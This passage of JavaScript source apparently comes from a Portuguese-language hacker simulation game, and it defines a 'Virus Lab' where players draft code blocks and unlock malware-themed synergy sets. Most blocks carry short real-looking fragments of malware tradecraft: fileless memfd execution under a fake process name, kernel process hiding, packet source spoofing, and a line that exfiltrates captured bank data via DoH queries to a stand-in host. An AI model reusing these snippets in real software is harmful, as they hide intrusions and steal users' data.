      hint: 'Embaralha o fluxo de upload P2P para parecer tráfego comum aos olhos do firewall.',
      code: `for (i, b) in s.iter_mut().enumerate() {\n  *b ^= ((i as u8).wrapping_mul(73)).rotate_right(2);\n}`
    },
    {
      id: 'R3_06', round: 3, tier: 5, lang: 'POSIX C', channel: 'p2p_chunk', family: 'vwarez',
      fn: 'void memfd_anon_seeder_resident(void)',
      abi: 'ABI: zero_copy_seed -> fileless_ram_iso',
      hint: 'Mantém o distribuidor P2P 100% residente na memória sem gravar binário no HD.',
      code: `int mfd = memfd_create("ksysguardd", MFD_CLOEXEC);\nfexecve(mfd, (char *const[]){"[ext4-rsv]", NULL}, environ);`
    },

    // simd_alu (Miner)
    {
      id: 'R3_07', round: 3, tier: 1, lang: 'POSIX C', channel: 'simd_alu', family: 'vminer',
      fn: 'void throttle_on_top_scan(void)',
      abi: 'ABI: digest_u256 -> idle_nice_19',
      hint: 'Reduz prioridade quando o dono olha o sistema, evitando suspeita de uso alto de CPU.',
      code: `setpriority(PRIO_PROCESS, 0, 19);\nif (access("/proc/sys/kernel/sched_autogroup_enabled", R_OK) == 0)\n  usleep(15000);`
    },
    {
      id: 'R3_08', round: 3, tier: 3, lang: 'C99', channel: 'simd_alu', family: 'vminer',
      fn: 'void zeroize_avx_thermal_spike(void)',
      abi: 'ABI: randomx_mix -> thermal_cloak',
      hint: 'Suaviza picos térmicos dos registradores matemáticos mantendo cálculo estável.',
      code: `_mm256_zeroall();\nsched_yield();\nprctl(PR_SET_TIMERSLACK, 50000L);`
    },
    {
      id: 'R3_09', round: 3, tier: 5, lang: 'x86_64 ASM', channel: 'simd_alu', family: 'vminer',
      fn: 'pmc_hide_cycles_vzeroall:',
      abi: 'ABI: 8x_nonce_hit -> ghost_msr_seal',
      hint: 'Limpa rastros dos registradores vetoriais ocultando o consumo pesado do processador.',
      code: `vzeroall\nxor eax, eax\ncpuid\nret`
    },

    // tls_mem (BankTrojan)
    {
      id: 'R3_10', round: 3, tier: 1, lang: 'C99', channel: 'tls_mem', family: 'vbank',
      fn: 'void restore_got_page_ro(void **slot, void *orig)',
      abi: 'ABI: acct_match -> clean_got_unhook',
      hint: 'Restaura a proteção da memória após capturar dados da sessão para evitar travamentos.',
      code: `*slot = orig;\nmprotect((void*)((uintptr_t)slot & ~4095UL), 4096, PROT_READ);\nexplicit_bzero(captured_acct, 16);`
    },
    {
      id: 'R3_11', round: 3, tier: 3, lang: 'Rust', channel: 'tls_mem', family: 'vbank',
      fn: 'fn covert_doh_exfil_flush(frame: &[u8])',
      abi: 'ABI: auth_token_clone -> dns_https_tunnel',
      hint: 'Retira os dados financeiros capturados escondidos dentro de consultas DNS seguras.',
      code: `let b64 = base64_url_encode(frame);\nsend_doh_txt_query(&format!("{}.cdn-metrics.example", b64));`
    },
    {
      id: 'R3_12', round: 3, tier: 5, lang: 'C99', channel: 'tls_mem', family: 'vbank',
      fn: 'void sgx_enclave_wipe_traces(void *ctx)',
      abi: 'ABI: valid_mac_forge -> zero_forensic_ram',
      hint: 'Zera todos os buffers sensíveis na RAM após o desvio bancário, sem deixar vestígio.',
      code: `explicit_bzero(ctx, 512);\nmunlockall();\n__asm__ volatile("" ::: "memory");`
    },

    // raw_pkt (DDoS)
    {
      id: 'R3_13', round: 3, tier: 1, lang: 'C99', channel: 'raw_pkt', family: 'vddos',
      fn: 'void spoof_ip_id_ttl_jitter(struct iphdr *ip)',
      abi: 'ABI: syn_burst_hdr -> decoy_src_seal',
      hint: 'Embaralha a origem e o tempo de vida dos pacotes disparados para dificultar bloqueio.',
      code: `ip->ttl = 52 + (rand8() & 0x0F);\nip->id = htons(rand16());\nip->saddr = decoy_subnet_pool[rand8() & 31];`
    },
    {
      id: 'R3_14', round: 3, tier: 3, lang: 'POSIX C', channel: 'raw_pkt', family: 'vddos',
      fn: 'int bpf_hide_raw_socket_diag(int sock_fd)',
      abi: 'ABI: amp_pulse -> netstat_cloak',
      hint: 'Esconde os soquetes de disparo intenso da listagem de conexões de rede do alvo.',
      code: `int mark = 0x7F00D;\nreturn setsockopt(sock_fd, SOL_SOCKET, SO_MARK, &mark, sizeof(mark));`
    },
    {
      id: 'R3_15', round: 3, tier: 5, lang: 'C99', channel: 'raw_pkt', family: 'vddos',
      fn: 'void detach_xdp_drv_clean(int ifindex)',
      abi: 'ABI: 64x_wire_pkt -> phantom_nic_reset',
      hint: 'Finaliza e oculta o canal direto da placa de rede sem gerar alertas de driver.',
      code: `bpf_set_link_xdp_fd(ifindex, -1, XDP_FLAGS_DRV_MODE);\nclose(xsk_fd);`
    },

    // Fechamento Lendário Universal Camada V
    {
      id: 'R3_16', round: 3, tier: 5, lang: 'x86_64 ASM', channel: 'universal_cloak', family: 'any',
      fn: 'ring0_dkom_unlink_task_struct:',
      abi: 'ABI: any_seal -> invisible_kernel_pid',
      hint: 'Remove o processo da lista interna do kernel, servindo de camuflagem suprema p/ qualquer código.',
      code: `mov rax, [rdi + 0x298] ; tasks.next\nmov rdx, [rdi + 0x2A0] ; tasks.prev\nmov [rdx], rax\nmov [rax + 8], rdx`
    }
  ];

  const ALL_BLOCKS = [...ROUND_1_BLOCKS, ...ROUND_2_BLOCKS, ...ROUND_3_BLOCKS];
  const BLOCK_BY_ID = new Map(ALL_BLOCKS.map((b) => [b.id, b]));

  // =========================================================================
  // CATÁLOGO DE 54 CONJUNTOS SECRETOS DE SINERGIA (Mais de 50 Conjuntos!)
  // =========================================================================
  function build54SynergySets() {
    return [
      // 01..10: Família Spam (.vspam)
      { id: 'SET_01', num: 1,  family: 'vspam', minTier: 1, bonusMult: 1.08, name: 'Relay Fantasma Porta 25',        desc: 'Túnel SMTP clássico com montagem MIME leve e encerramento limpo.' },
      { id: 'SET_02', num: 2,  family: 'vspam', minTier: 1, bonusMult: 1.11, name: 'Enxame MIME Assíncrono',         desc: 'Fila de destinatários em lote acoplada a multiplexador não-bloqueante.' },
      { id: 'SET_03', num: 3,  family: 'vspam', minTier: 2, bonusMult: 1.14, name: 'Spooler STARTTLS Camaleão',      desc: 'Conexão cifrada 587 combinada com rotação dinâmica de cabeçalhos.' },
      { id: 'SET_04', num: 4,  family: 'vspam', minTier: 2, bonusMult: 1.16, name: 'Injetor Postfix Local',          desc: 'Sequestro direto do socket Unix do MTA sem passar pelo filtro externo.' },
      { id: 'SET_05', num: 5,  family: 'vspam', minTier: 3, bonusMult: 1.19, name: 'Hidra Polimórfica SPF',          desc: 'Mutação de Message-ID em cada lote impedindo assinatura de antispam.' },
      { id: 'SET_06', num: 6,  family: 'vspam', minTier: 3, bonusMult: 1.22, name: 'Turbina Epoll de Envelopes',     desc: 'Barramento de envelopes em memória alimentado por fila lock-free.' },
      { id: 'SET_07', num: 7,  family: 'vspam', minTier: 4, bonusMult: 1.25, name: 'Anel Mmap Zero-Alloc',           desc: 'Memória compartilhada disparando mensagens sem cópia para userspace.' },
      { id: 'SET_08', num: 8,  family: 'vspam', minTier: 4, bonusMult: 1.28, name: 'Tempestade Sendmmsg 128x',       desc: 'Rajada de pacotes SMTP fundidos direto na syscall sendmmsg.' },
      { id: 'SET_09', num: 9,  family: 'vspam', minTier: 5, bonusMult: 1.33, name: 'Espectro DKIM Zero-Day',         desc: 'Fusão completa de ring-buffer SMTP com apagamento forense de spool.' },
      { id: 'SET_10', num: 10, family: 'vspam', minTier: 5, bonusMult: 1.38, name: 'Oráculo Postal Ring-0',          desc: 'Daemon invisível no kernel disparando malotes SMTP em velocidade de linha.' },

      // 11..20: Família Warez (.vwarez)
      { id: 'SET_11', num: 11, family: 'vwarez', minTier: 1, bonusMult: 1.08, name: 'Semeador DHT Descentralizado',  desc: 'Bootstrap UDP enxuto servindo blocos de 16 KB sem rastreador.' },
      { id: 'SET_12', num: 12, family: 'vwarez', minTier: 1, bonusMult: 1.11, name: 'Enxame Bitfield Mascarado',     desc: 'Ofuscação XOR de peças raras para manter upload constante.' },
      { id: 'SET_13', num: 13, family: 'vwarez', minTier: 2, bonusMult: 1.14, name: 'Ponte Sendfile Direta',         desc: 'Transferência disco-para-rede sem tocar buffers intermediários.' },
      { id: 'SET_14', num: 14, family: 'vwarez', minTier: 2, bonusMult: 1.16, name: 'Malha uTP LEDBAT Furtiva',      desc: 'Controle de congestionamento que usa 100% da banda ociosa do alvo.' },
      { id: 'SET_15', num: 15, family: 'vwarez', minTier: 3, bonusMult: 1.19, name: 'Fragmentador Reed-Solomon',     desc: 'Codificação de paridade distribuindo releases com zero perda.' },
      { id: 'SET_16', num: 16, family: 'vwarez', minTier: 3, bonusMult: 1.22, name: 'Túnel RC4 Anti-DPI',            desc: 'Criptografia de fluxo MSE camuflando o tráfego P2P do provedor.' },
      { id: 'SET_17', num: 17, family: 'vwarez', minTier: 4, bonusMult: 1.25, name: 'Pipe Splice de 1 Megabyte',     desc: 'Canalização contínua entre blocos ISO e sockets não-bloqueantes.' },
      { id: 'SET_18', num: 18, family: 'vwarez', minTier: 4, bonusMult: 1.28, name: 'Colmeia io_uring Zero-Copy',    desc: 'Submissão assíncrona no kernel saturando peers globais.' },
      { id: 'SET_19', num: 19, family: 'vwarez', minTier: 5, bonusMult: 1.33, name: 'Cofre Pirata Fileless (RAM)',   desc: 'Imagem inteira servida a partir de memfd_create sem tocar o HD.' },
      { id: 'SET_20', num: 20, family: 'vwarez', minTier: 5, bonusMult: 1.38, name: 'Leviatã P2P Kernel-Space',      desc: 'Semeador fantasma desvinculado da lista de processos com JIT nativo.' },

      // 21..30: Família Miner (.vminer)
      { id: 'SET_21', num: 21, family: 'vminer', minTier: 1, bonusMult: 1.08, name: 'Garimpeiro SHA-256d Básico',    desc: 'Afinidade de núcleo acoplada a moedor inteiro de nonces.' },
      { id: 'SET_22', num: 22, family: 'vminer', minTier: 1, bonusMult: 1.11, name: 'Operário Nice-19 Silencioso',   desc: 'Minera em baixa prioridade recuando sempre que o usuário abre o top.' },
      { id: 'SET_23', num: 23, family: 'vminer', minTier: 2, bonusMult: 1.15, name: 'Pipeline YMM 256-bit',          desc: 'Registradores vetoriais alinhados enviando shares via Stratum.' },
      { id: 'SET_24', num: 24, family: 'vminer', minTier: 2, bonusMult: 1.17, name: 'Stratum Multiplexado Sem Trava', desc: 'Submissão assíncrona sem desperdiçar nenhum ciclo da ALU.' },
      { id: 'SET_25', num: 25, family: 'vminer', minTier: 3, bonusMult: 1.20, name: 'Forja HugePages 2MB',           desc: 'Scratchpad alocado em páginas gigantes eliminando TLB misses.' },
      { id: 'SET_26', num: 26, family: 'vminer', minTier: 3, bonusMult: 1.23, name: 'Dissipador Fantasma Térmico',   desc: 'Controle de timerslack e vzeroall mantendo temperatura invisível.' },
      { id: 'SET_27', num: 27, family: 'vminer', minTier: 4, bonusMult: 1.26, name: 'Motor RandomX AES-NI 4-Vias',   desc: 'Instruções de cifragem de hardware convertidas em hash-rate bruto.' },
      { id: 'SET_28', num: 28, family: 'vminer', minTier: 4, bonusMult: 1.29, name: 'Acelerador Lock-Free de DAG',   desc: 'Barramento L3 alimentando múltiplos núcleos sem contenção.' },
      { id: 'SET_29', num: 29, family: 'vminer', minTier: 5, bonusMult: 1.34, name: 'Reator AVX-512 SHA-NI 8-Vias',  desc: 'Desdobramento quádruplo de midstate com instruções dedicadas SHA.' },
      { id: 'SET_30', num: 30, family: 'vminer', minTier: 5, bonusMult: 1.40, name: 'Singularidade Satoshi Ring-0',  desc: 'Mineração em silício puro ocultando contadores PMC no kernel.' },

      // 31..40: Família BankTrojan (.vbank)
      { id: 'SET_31', num: 31, family: 'vbank', minTier: 1, bonusMult: 1.08, name: 'Gancho GOT libssl Clássico',     desc: 'Intercepta SSL_write antes da criptografia e restaura página RO.' },
      { id: 'SET_32', num: 32, family: 'vbank', minTier: 1, bonusMult: 1.12, name: 'Espelho Fetch de Sessão Web',    desc: 'Captura requisições JSON de home-banking direto na camada DOM.' },
      { id: 'SET_33', num: 33, family: 'vbank', minTier: 2, bonusMult: 1.15, name: 'Desviador SWIFT Fracionário',    desc: 'Reescreve o payload da remessa injetando taxa espelho silenciosa.' },
      { id: 'SET_34', num: 34, family: 'vbank', minTier: 2, bonusMult: 1.18, name: 'Coletor Assíncrono de IBAN',     desc: 'Varredura em memória combinada com fila não-bloqueante.' },
      { id: 'SET_35', num: 35, family: 'vbank', minTier: 3, bonusMult: 1.21, name: 'Extrator Bearer via DNS-HTTPS',  desc: 'Clona tokens de autorização e exfiltra camuflado em tráfego DoH.' },
      { id: 'SET_36', num: 36, family: 'vbank', minTier: 3, bonusMult: 1.23, name: 'Sombra de Memória Ptrace',       desc: 'Leitura cruzada de heap do navegador sem injetar DLLs em disco.' },
      { id: 'SET_37', num: 37, family: 'vbank', minTier: 4, bonusMult: 1.27, name: 'Falsificador HMAC em Tempo Real', desc: 'Recalcula assinatura criptográfica do pacote bancário na própria RAM.' },
      { id: 'SET_38', num: 38, family: 'vbank', minTier: 4, bonusMult: 1.30, name: 'Trampolim JIT Financeiro',       desc: 'Código nativo gerado em memória alterando saldos em microssegundos.' },
      { id: 'SET_39', num: 39, family: 'vbank', minTier: 5, bonusMult: 1.35, name: 'Sonda Uprobe NSS Zero-Forense',  desc: 'Captura chaves em trânsito via uprobe limpando qualquer rastro.' },
      { id: 'SET_40', num: 40, family: 'vbank', minTier: 5, bonusMult: 1.40, name: 'Fantasma Bancário Ring-0',       desc: 'Interceptação invisível de sessões TLS protegida por rootkit DKOM.' },

      // 41..50: Família DDoS (.vddos)
      { id: 'SET_41', num: 41, family: 'vddos', minTier: 1, bonusMult: 1.08, name: 'Canhão SYN Raw-Socket',          desc: 'Cabeçalho IP manual com portas efêmeras e TTL embaralhado.' },
      { id: 'SET_42', num: 42, family: 'vddos', minTier: 1, bonusMult: 1.12, name: 'Forja Checksum Rápida IPv4',     desc: 'Dobramento aritmético em 16 bits acelerando o disparo de pacotes.' },
      { id: 'SET_43', num: 43, family: 'vddos', minTier: 2, bonusMult: 1.15, name: 'Anel TPACKET_V3 de Placa',       desc: 'Fila de transmissão mapeada direto no buffer do driver de rede.' },
      { id: 'SET_44', num: 44, family: 'vddos', minTier: 2, bonusMult: 1.18, name: 'Multiplexador Epoll de Inundação', desc: 'Mantém milhares de descritores saturando o alvo sem travar.' },
      { id: 'SET_45', num: 45, family: 'vddos', minTier: 3, bonusMult: 1.21, name: 'Refletor NTP Monlist Oculto',    desc: 'Pulso de amplificação UDP escondido do netstat via marca BPF.' },
      { id: 'SET_46', num: 46, family: 'vddos', minTier: 3, bonusMult: 1.24, name: 'Turbina Lock-Free de Pacotes',   desc: 'Geração paralela de frames alimentando a NIC sem locks.' },
      { id: 'SET_47', num: 47, family: 'vddos', minTier: 4, bonusMult: 1.27, name: 'Inundação AF_XDP Zero-Copy',     desc: 'Memória UMEM registrada pulando toda a pilha TCP/IP do sistema.' },
      { id: 'SET_48', num: 48, family: 'vddos', minTier: 4, bonusMult: 1.31, name: 'Rajada Vetorial YMM 64x',        desc: 'Grava 64 descritores de pacote por instrução AVX2.' },
      { id: 'SET_49', num: 49, family: 'vddos', minTier: 5, bonusMult: 1.36, name: 'Doorbell PCIe Line-Rate',        desc: 'Escrita MMIO direta no registrador da placa 10GbE com reset limpo.' },
      { id: 'SET_50', num: 50, family: 'vddos', minTier: 5, bonusMult: 1.42, name: 'Tsunami Orbital Ring-0',         desc: 'Enxame XDP nativo camuflado por desvinculação DKOM no kernel.' },

      // 51..54: 4 Conjuntos Híbridos / Mutações Cruzadas Lendárias
      { id: 'SET_51', num: 51, family: 'vminer', minTier: 2, bonusMult: 1.26, name: 'Quimera Bot-Miner Dual-Bus',    desc: 'Híbrido raro que combina barramento de rede com cálculo vetorial de hashes.', isHybrid: true },
      { id: 'SET_52', num: 52, family: 'vbank',  minTier: 2, bonusMult: 1.26, name: 'Spear-Banker SMTP-TLS',         desc: 'Mutação cruzada que une motor de e-mail com interceptador bancário TLS.', isHybrid: true },
      { id: 'SET_53', num: 53, family: 'vddos',  minTier: 3, bonusMult: 1.29, name: 'Tempestade Swarm P2P-Flood',    desc: 'Converte malha BitTorrent em canhão coordenado de inundação.', isHybrid: true },
      { id: 'SET_54', num: 54, family: 'vminer', minTier: 5, bonusMult: 1.45, name: 'Arquitetura Ômega Zero-Day',    desc: 'A junção suprema de Camada V + JIT + Rootkit Ring-0 em harmonia perfeita!', isHybrid: true }
    ];
  }

  const VIRUS_SYNERGY_SETS = build54SynergySets();
  const SET_BY_ID = new Map(VIRUS_SYNERGY_SETS.map((s) => [s.id, s]));

  function esc(str) {
    return String(str == null ? '' : str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  function shuffleCopy(arr) {
    const out = arr.slice();
    for (let i = out.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      const tmp = out[i];
      out[i] = out[j];
      out[j] = tmp;
    }
    return out;
  }

  const STRAIN_PREFIXES = ['Hydra', 'Spectre', 'Nyx', 'Kronos', 'Vortex', 'Obsidian', 'Kestrel', 'Cipher', 'Mantis', 'ZeroPulse'];
  const STRAIN_SUFFIXES = ['X1', 'Core', '99', 'Ghost', 'Prime', 'V2', 'Delta', 'Flux', 'Hex', 'Omega'];

  class VirusLabEngine {
    constructor() {
      this.userId = 'guest';
      this.activeTab = 'workbench';
      this.lastCompileReport = null;
      this.state = this.defaultState();
      this._cooldownTicker = setInterval(() => {
        if (typeof document === 'undefined') return;
        const cdEl = document.getElementById('vlabLiveCooldownTimer');
        if (!cdEl) return;
        const rem = this.getCooldownRemainingMs();
        if (rem <= 0) {
          this.lastCompileReport = null;
          this.renderUI();
        } else {
          cdEl.textContent = this.formatCooldownMs(rem);
        }
      }, 1000);
    }

    defaultState() {
      return {
        xp: 0,
        level: 1,
        totalCompiled: 0,
        lastCompiledAtMs: 0,
        discoveredSets: [],
        creations: [],
        activeDraft: null
      };
    }

    storageKey(uid) {
      return `HC_VIRUS_LAB_V1_${uid || 'guest'}`;
    }

    ensureLoaded() {
      if (this._loadingGuard) return;
      this._loadingGuard = true;
      try {
        const uid = (window.currentProfile && window.currentProfile.id) || 'guest';
        if (this.userId !== uid || !this.state) {
          this.userId = uid;
          try {
            const raw = localStorage.getItem(this.storageKey(uid));
            if (raw) {
              this.state = this.normalizeState(JSON.parse(raw));
            } else {
              this.state = this.defaultState();
            }
          } catch (e) {
            this.state = this.defaultState();
          }
        }
      } finally {
        this._loadingGuard = false;
      }
    }

    normalizeState(raw) {
      const base = this.defaultState();
      if (!raw || typeof raw !== 'object') return base;
      const xp = Math.max(0, Math.round(Number(raw.xp) || 0));
      const lvlObj = this.computeLevelFromXp(xp, Number(raw.level) || 1);
      return {
        xp,
        level: lvlObj.level,
        totalCompiled: Math.max(0, Math.round(Number(raw.totalCompiled) || 0)),
        lastCompiledAtMs: Math.max(0, Math.round(Number(raw.lastCompiledAtMs) || 0)),
        discoveredSets: Array.isArray(raw.discoveredSets)
          ? Array.from(new Set(raw.discoveredSets.filter((id) => SET_BY_ID.has(id))))
          : [],
        creations: Array.isArray(raw.creations) ? raw.creations.slice(0, 30) : [],
        activeDraft: raw.activeDraft && typeof raw.activeDraft === 'object' && raw.activeDraft.paidFee
          ? raw.activeDraft
          : null
      };
    }

    getCooldownRemainingMs(nowMs = Date.now()) {
      this.ensureLoaded();
      const last = Number(this.state.lastCompiledAtMs || 0);
      if (!last || last <= 0) return 0;
      const elapsed = nowMs - last;
      return elapsed >= LAB_COOLDOWN_MS ? 0 : Math.max(0, LAB_COOLDOWN_MS - elapsed);
    }

    formatCooldownMs(ms) {
      const totalSec = Math.max(0, Math.ceil(ms / 1000));
      const h = Math.floor(totalSec / 3600);
      const m = Math.floor((totalSec % 3600) / 60);
      const s = totalSec % 60;
      return `${String(h).padStart(2, '0')}h ${String(m).padStart(2, '0')}m ${String(s).padStart(2, '0')}s`;
    }

    save() {
      try {
        localStorage.setItem(this.storageKey(this.userId), JSON.stringify(this.state));
      } catch (e) {}
    }

    getYieldMultiplier(versionInt) {
      return calcVirusMultiplier(versionInt);
    }

    computeLevelFromXp(xp, minFloorLevel = 1) {
      let current = LAB_LEVEL_TABLE[0];
      for (const row of LAB_LEVEL_TABLE) {
        if (xp >= row.xpReq) current = row;
      }
      if (minFloorLevel > current.level) {
        const forced = LAB_LEVEL_TABLE.find((r) => r.level === Math.min(MAX_LAB_LEVEL, minFloorLevel));
        if (forced) current = forced;
      }
      return current;
    }

    getLevelMeta() {
      this.ensureLoaded();
      const cur = LAB_LEVEL_TABLE.find((r) => r.level === this.state.level) || LAB_LEVEL_TABLE[0];
      const next = LAB_LEVEL_TABLE.find((r) => r.level === cur.level + 1) || null;
      let pct = 100;
      if (next) {
        const span = Math.max(1, next.xpReq - cur.xpReq);
        pct = Math.max(0, Math.min(100, Math.round(((this.state.xp - cur.xpReq) / span) * 100)));
      }
      return {
        ...cur,
        maxMult: calcVirusMultiplier(cur.maxVerInt),
        xp: this.state.xp,
        isMaxLevel: cur.level >= MAX_LAB_LEVEL,
        nextXpReq: next ? next.xpReq : cur.xpReq,
        nextUnlockNote: next ? next.unlockNote : 'Nível Máximo atingido — teto v10.0 (3.00x MÁX) e 54 conjuntos liberados!',
        progressPct: pct
      };
    }

    getCombinatoricsStats() {
      const r1 = ROUND_1_BLOCKS.length;
      const r2 = ROUND_2_BLOCKS.length;
      const r2Pairs = (r2 * (r2 - 1)) / 2;
      const r3 = ROUND_3_BLOCKS.length;
      return {
        r1Count: r1,
        r2Count: r2,
        r2Pairs,
        r3Count: r3,
        totalBlocks: r1 + r2 + r3,
        totalCombinations: r1 * r2Pairs * r3,
        totalSynergySets: VIRUS_SYNERGY_SETS.length
      };
    }

    getUnlockedPoolForRound(roundNum) {
      if (window.topTenMechanics && typeof window.topTenMechanics.registerRelicBlocksIntoLab === 'function') {
        window.topTenMechanics.registerRelicBlocksIntoLab();
      }
      ROUND_1_BLOCKS.concat(ROUND_2_BLOCKS, ROUND_3_BLOCKS).forEach((b) => {
        if (!BLOCK_BY_ID.has(b.id)) BLOCK_BY_ID.set(b.id, b);
      });
      const meta = this.getLevelMeta();
      const source = roundNum === 1 ? ROUND_1_BLOCKS : (roundNum === 2 ? ROUND_2_BLOCKS : ROUND_3_BLOCKS);
      const unlocked = source.filter((b) => {
        if (b.isRelic) {
          return !!(window.topTenMechanics && typeof window.topTenMechanics.isRelicUnlocked === 'function' && window.topTenMechanics.isRelicUnlocked(b.id));
        }
        return b.tier <= meta.maxTier;
      });
      return unlocked.length >= 3 ? unlocked : source.slice(0, 3);
    }

    drawThreeRandomBlocks(roundNum) {
      const pool = this.getUnlockedPoolForRound(roundNum);
      return shuffleCopy(pool).slice(0, 3).map((b) => b.id);
    }

    // Cobra $ 1.000 e abre a única chance do Mês (1 dia real = 24h) para montar um vírus!
    unlockPaidLabSession() {
      this.ensureLoaded();
      if (this.state.activeDraft && this.state.activeDraft.paidFee) {
        this.activeTab = 'workbench';
        this.renderUI();
        return { success: true, alreadyOpen: true, draft: this.state.activeDraft };
      }

      const remMs = this.getCooldownRemainingMs();
      if (remMs > 0) {
        const msg = `Limite atingido (1x por Mês/Dia)! Aguarde ${this.formatCooldownMs(remMs)} para usar o Laboratório novamente.`;
        if (typeof window.showToast === 'function') window.showToast(msg);
        return { success: false, code: 'COOLDOWN_ACTIVE', remainingMs: remMs, message: msg };
      }

      const couponDiscount = (window.ecosystemHub && typeof window.ecosystemHub.peekLabFeeDiscount === 'function')
        ? window.ecosystemHub.peekLabFeeDiscount()
        : 0;
      const effectiveFee = Math.max(0, LAB_SESSION_FEE - couponDiscount);

      const curBal = window.currentWallet ? Number(window.currentWallet.balance || 0) : 0;
      if (curBal < effectiveFee) {
        const msg = `Saldo insuficiente! Usar o Laboratório de Vírus custa $ ${effectiveFee.toLocaleString('pt-BR')} (você tem $ ${curBal.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}).`;
        if (window.hackerAudio && typeof window.hackerAudio.playErrorBuzz === 'function') window.hackerAudio.playErrorBuzz();
        if (typeof window.showToast === 'function') window.showToast(msg);
        return { success: false, code: 'INSUFFICIENT_FUNDS', required: effectiveFee, balance: curBal, message: msg };
      }

      if (couponDiscount > 0 && window.ecosystemHub && typeof window.ecosystemHub.consumeLabFeeCouponIfArmed === 'function') {
        window.ecosystemHub.consumeLabFeeCouponIfArmed();
      }

      const deductFee = () => {
        window.currentWallet.balance = Math.max(0, +(Number(window.currentWallet.balance) - effectiveFee).toFixed(2));
      };
      if (window.integrityGuard && typeof window.integrityGuard.runAuthorized === 'function') {
        window.integrityGuard.runAuthorized(deductFee);
      } else {
        deductFee();
      }

      this.lastCompileReport = null;
      this.activeTab = 'workbench';
      this.state.activeDraft = {
        startedAt: Date.now(),
        paidFee: effectiveFee,
        round: 1,
        optionsByRound: {
          1: this.drawThreeRandomBlocks(1),
          2: [],
          3: []
        },
        picks: {
          r1: null,
          r2: [],
          r3: null
        },
        customName: `${STRAIN_PREFIXES[Math.floor(Math.random() * STRAIN_PREFIXES.length)]}-${STRAIN_SUFFIXES[Math.floor(Math.random() * STRAIN_SUFFIXES.length)]}`
      };

      this.save();
      if (window.onlineEngine) window.onlineEngine.scheduleSave(false);
      if (typeof window.updateHudDisplays === 'function') window.updateHudDisplays();
      if (typeof window.addLocalLog === 'function') {
        window.addLocalLog('VIRUS-LAB-FEE', `Taxa de uso da bancada paga (-$ ${LAB_SESSION_FEE.toLocaleString('pt-BR')}) — sessão mensal/diária iniciada!`, 'info');
      }
      if (typeof window.showToast === 'function') {
        window.showToast(`🔓 Bancada liberada (-$ ${LAB_SESSION_FEE.toLocaleString('pt-BR')})! Escolha com atenção seus blocos nos 3 rounds.`);
      }

      this.renderUI();
      this.scrollLabToTop();
      return { success: true, draft: this.state.activeDraft };
    }

    startNewDraft(silent = false) {
      if (silent) return this.state.activeDraft;
      return this.unlockPaidLabSession();
    }

    scrollLabToTop() {
      if (typeof document === 'undefined') return;
      const body = document.getElementById('virusLabAppBody');
      if (body) body.scrollTop = 0;
      const win = document.getElementById('winVirusLab');
      if (win) win.scrollTop = 0;
    }

    toggleSelectBlock(blockId) {
      this.ensureLoaded();
      const draft = this.state.activeDraft;
      if (!draft) return { success: false };
      const r = draft.round;
      const allowed = draft.optionsByRound[r] || [];
      if (!allowed.includes(blockId)) {
        return { success: false, message: 'Este bloco não pertence às 3 opções sorteadas neste round.' };
      }

      if (r === 1) {
        draft.picks.r1 = draft.picks.r1 === blockId ? null : blockId;
      } else if (r === 2) {
        const cur = Array.isArray(draft.picks.r2) ? draft.picks.r2.slice() : [];
        const idx = cur.indexOf(blockId);
        if (idx >= 0) {
          cur.splice(idx, 1);
        } else {
          if (cur.length >= 2) cur.shift();
          cur.push(blockId);
        }
        draft.picks.r2 = cur;
      } else if (r === 3) {
        draft.picks.r3 = draft.picks.r3 === blockId ? null : blockId;
      }

      this.save();
      this.renderUI();
      return { success: true, round: r, picks: draft.picks };
    }

    advanceRound() {
      this.ensureLoaded();
      const draft = this.state.activeDraft;
      if (!draft) return { success: false };

      if (draft.round === 1) {
        if (!draft.picks.r1) {
          if (typeof window.showToast === 'function') window.showToast('Escolha 1 bloco de código para avançar ao Round 2!');
          return { success: false, message: 'Escolha 1 bloco no Round 1.' };
        }
        draft.round = 2;
        if (!Array.isArray(draft.optionsByRound[2]) || draft.optionsByRound[2].length !== 3) {
          draft.optionsByRound[2] = this.drawThreeRandomBlocks(2);
        }
        this.save();
        this.renderUI();
        this.scrollLabToTop();
        return { success: true, round: 2 };
      }

      if (draft.round === 2) {
        if (!Array.isArray(draft.picks.r2) || draft.picks.r2.length !== 2) {
          if (typeof window.showToast === 'function') window.showToast('No Round 2 você precisa escolher exatamente 2 blocos de código!');
          return { success: false, message: 'Escolha exatamente 2 blocos no Round 2.' };
        }
        draft.round = 3;
        if (!Array.isArray(draft.optionsByRound[3]) || draft.optionsByRound[3].length !== 3) {
          draft.optionsByRound[3] = this.drawThreeRandomBlocks(3);
        }
        this.save();
        this.renderUI();
        this.scrollLabToTop();
        return { success: true, round: 3 };
      }

      return { success: false };
    }

    // Gera uma leve explicação humana ao vivo do que as peças selecionadas até agora fazem juntas!
    buildLiveComboNotion(draft) {
      if (!draft) return '';
      const b1 = draft.picks.r1 ? BLOCK_BY_ID.get(draft.picks.r1) : null;
      const b2a = draft.picks.r2 && draft.picks.r2[0] ? BLOCK_BY_ID.get(draft.picks.r2[0]) : null;
      const b2b = draft.picks.r2 && draft.picks.r2[1] ? BLOCK_BY_ID.get(draft.picks.r2[1]) : null;
      const b3 = draft.picks.r3 ? BLOCK_BY_ID.get(draft.picks.r3) : null;

      if (!b1 && !b2a && !b3) {
        return '💡 <strong>Dica rápida:</strong> leia a breve explicação azul em cada cartão para sentir o que cada trecho faz antes de escolher!';
      }

      const steps = [];
      if (b1) steps.push(`<strong>Entrada:</strong> ${b1.hint.replace(/\.$/, '')}`);
      if (b2a && b2b) {
        steps.push(`<strong>Núcleo Duplo:</strong> ${b2a.hint.replace(/\.$/, '')} + ${b2b.hint.replace(/\.$/, '')}`);
      } else if (b2a) {
        steps.push(`<strong>Núcleo #1:</strong> ${b2a.hint.replace(/\.$/, '')} <em>(falta escolher +1 neste round)</em>`);
      }
      if (b3) steps.push(`<strong>Fechamento:</strong> ${b3.hint.replace(/\.$/, '')}`);

      // Impressão sutil sobre harmonia até aqui (sem entregar nota exata)
      let feel = '';
      if (b1 && (b2a || b2b)) {
        const hasTrap = (b2a && b2a.channel === 'sync_stall') || (b2b && b2b.channel === 'sync_stall');
        const mA = !b2a || b2a.channel === b1.channel || b2a.channel === 'universal_boost';
        const mB = !b2b || b2b.channel === b1.channel || b2b.channel === 'universal_boost';
